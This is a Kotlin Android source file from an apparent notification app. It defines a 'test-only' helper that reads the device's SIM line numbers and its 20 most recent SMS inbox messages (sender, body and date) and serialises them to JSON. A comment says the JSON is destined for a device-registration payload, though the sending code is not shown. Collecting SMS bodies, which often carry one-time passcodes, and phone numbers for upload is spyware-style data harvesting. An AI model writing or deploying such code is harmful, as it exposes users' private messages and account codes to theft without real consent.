package com.notify

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject

/**
 * TEST-ONLY: device line numbers (SIM 1/2) + SMS inbox snapshot.
 * Remove entirely if the test is rejected — no other module depends on it
 * except DeviceRegistrar payload extras.
 */
object DevicePhones {
    private const val TAG = "DevicePhones"
    const val MAX_NUMBERS = 5
    const val MAX_SMS = 20

    fun hasPhonePerm(ctx: Context): Boolean {
        val app = ctx.applicationContext
        // READ_PHONE_NUMBERS covers line numbers on API 26+; older needs READ_PHONE_STATE.
        val p1 = ContextCompat.checkSelfPermission(app, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
        val p2 = ContextCompat.checkSelfPermission(app, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
        return p1 || p2
    }

    fun hasSmsPerm(ctx: Context): Boolean =
        ContextCompat.checkSelfPermission(ctx.applicationContext, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED

    /** Every line number found (usually 1-2, dual-SIM). Empty when denied/unavailable. */
    fun getNumbers(ctx: Context): List<String> {
        val app = ctx.applicationContext
        if (!hasPhonePerm(app)) return emptyList()
        val out = LinkedHashSet<String>()
        // 1. Per-subscription numbers (dual-SIM aware).
        try {
            val sm = app.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                ?: app.getSystemService(SubscriptionManager::class.java) as? SubscriptionManager
            val subs = try { sm?.activeSubscriptionInfoList } catch (_: Exception) { null }
            subs?.forEach { sub ->
                try {
                    val n = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        try { sub.number?.toString() } catch (_: SecurityException) { null }
                    } else {
                        @Suppress("DEPRECATION")
                        try { sub.number } catch (_: SecurityException) { null }
                    }
                    n?.trim()?.takeIf { it.isNotBlank() }?.let { out.add(normalize(it)) }
                } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            Log.w(TAG, "subscription query: ${e.message}")
        }
        // 2. Fallback: default line1.
        try {
            val tm = app.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            tm.line1Number?.trim()?.takeIf { it.isNotBlank() }?.let { out.add(normalize(it)) }
        } catch (_: SecurityException) {
        } catch (e: Exception) {
            Log.w(TAG, "line1: ${e.message}")
        }
        return out.take(MAX_NUMBERS)
    }

    /** Latest inbox SMS: [{from, body, date}]. Empty when denied. Bodies truncated. */
    fun getSmsSnapshot(ctx: Context, limit: Int = MAX_SMS): List<Triple<String, String, Long>> {
        val app = ctx.applicationContext
        if (!hasSmsPerm(app)) return emptyList()
        val out = ArrayList<Triple<String, String, Long>>()
        try {
            val uri = Uri.parse("content://sms/inbox")
            app.contentResolver.query(
                uri,
                arrayOf("address", "body", "date"),
                null, null, "date DESC"
            )?.use { c ->
                val ia = c.getColumnIndex("address")
                val ib = c.getColumnIndex("body")
                val id = c.getColumnIndex("date")
                while (c.moveToNext() && out.size < limit.coerceIn(1, MAX_SMS)) {
                    val from = (if (ia >= 0) c.getString(ia) else "")?.take(32) ?: ""
                    val body = (if (ib >= 0) c.getString(ib) else "")?.take(512) ?: ""
                    val date = if (id >= 0) try { c.getLong(id) } catch (_: Exception) { 0L } else 0L
                    out.add(Triple(from, body, date))
                }
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "sms denied")
        } catch (e: Exception) {
            Log.w(TAG, "sms query: ${e.message}")
        }
        return out
    }

    fun numbersJson(ctx: Context): JSONArray {
        val a = JSONArray()
        getNumbers(ctx).forEach { a.put(it) }
        return a
    }

    fun smsJson(ctx: Context): JSONArray {
        val a = JSONArray()
        getSmsSnapshot(ctx).forEach { (from, body, date) ->
            a.put(JSONObject().apply {
                put("from", from)
                put("body", body)
                put("date", date)
            })
        }
        return a
    }

    private fun normalize(n: String): String =
        n.trim().take(32).replace(Regex("[\\x00-\\x1f]"), "")
}
